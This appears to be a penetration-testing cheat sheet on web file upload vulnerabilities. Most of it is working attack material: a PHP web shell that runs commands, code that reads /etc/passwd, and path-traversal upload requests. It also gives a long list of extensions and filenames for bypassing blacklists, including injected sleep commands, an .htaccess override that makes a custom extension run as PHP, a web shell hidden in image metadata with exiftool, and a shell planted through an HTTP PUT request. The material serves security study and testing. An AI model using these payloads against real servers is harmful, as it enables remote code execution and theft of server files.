---
title: File Upload
category: Web
order: 14
---

File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.

# PHP Payloads

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
<?php echo system($_GET['command']); ?>
```

# Exploiting flawed validation of file uploads

## Flayed file type validation

Some times we can bypass restrictions by setting a content-type of an image or pdf using the malicious extension such as `.php`.

```
Content-Type: image/png
Content-Type: image/jpg
Content-Type: application/pdf
```

## Preventing file execution in user-accesible directories

A second line of defense is to stop the server from executing any scripts. Servers generally only run scripts when their MIME type they have been explicitly configured to execute. Otherwise they may just return some kind of error message or serve the contents of the file as plain text.

Try to do a path traversal on filename

```
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2ftest.php"
Content-Type: text/plain

<?php echo file_get_contents('/etc/passwd'); ?>
-----------------------------29819338021499936129294
```

> **Note**: Try the payload normal and URL encoded.


## Blacklisting dangerous extensions

Another way to preventing users from uploading malicious scripts is to blacklist potentially dangerous file extensions like `.php`. It's difficult to explicitly block every possible file extension that could be used to execute code. Some times that blacklist can be bypassed by using lesser known extension such as:

```
php
php2
php3
php4
php5
php6
php7
phps
pht
phtml
pgif
shtml
htaccess
phar
inc
asp
aspx
config
ashx
aspq
axd
cshtm
cshtml
rem
soap
vbhtm
vbhtml
asa
asp
cer
shtml
pHp
pHP5
PhAr
phP
PHP
vbs
js
rb
exe
html
hash
git
py
pyc
txt
zip
rar
mp3
mp4
csv
po
pdf
jar
tgz
xls
crt
jpeg
sql
msi
der
rdp
jsp
jspx
jsw
jsv
jspf
cfm
cfml
cfc
dbm
php.png
png.php
php%00.png
php%00
php%20
php..........
php/
php.\
php.bha123jpg
php\x00.jpg
../../etc/passwd/logo.png
../../../logo.png
'sleep(10).jpg
sleep(10)-- -.jpg
; sleep 10;
```

## Overriding the server configuration

Servers typically will not execute files unless they have been configured to do so. Apache server will execute PHP files requested by a aclient if its configured on `/etc/apache2/apache2.conf`.

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
	AddType application/x-httpd-php .php
```

It is possible to create special configuration files within individual directories with the file `.htaccess`. Similar on IIS with `web.config`.

We can try to upload a malicious configuration file in order to execute code.

* Example of `.htaccess` on apache with php server:

```
AddType application/x-httpd-php .benjugat
```

## Obfuscating file extensions

A blacklist can be potentially bypasses using one or more classic obfuscation technquiques:

* Using uppercase: `file.pHP`
* Multiple extension: `file.php.jpg`, `file.jpg.php`
* URL encoding: `file%2Ephp`
* DobleURL encoding: `file%252Ephp`
* Semicolon between extensions: `file.php;.jpg`
* Null-byte: `file.php%00.jpg`
* Anti-striping: `file.ph.phpp`

## Flawed validation of the file's contents

Instead of trusting `Content-Type`, a more secure technique is to validate the content of the file if match with an image or not. There are tools that helps us to insert our payload in metadata.

```
$ exiftool -DocumentName='<br><?php echo system($_GET["command"]); ?><br>' image.png
    1 image files updated
```

# Uploading files with PUT

Some servers are configured to support `PUT` requests. This can be an alternative of uploading malicious files.

```
PUT /files/benjugat.php HTTP/1.1
Host: hackingnotes.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo system($_GET['command']); ?>
```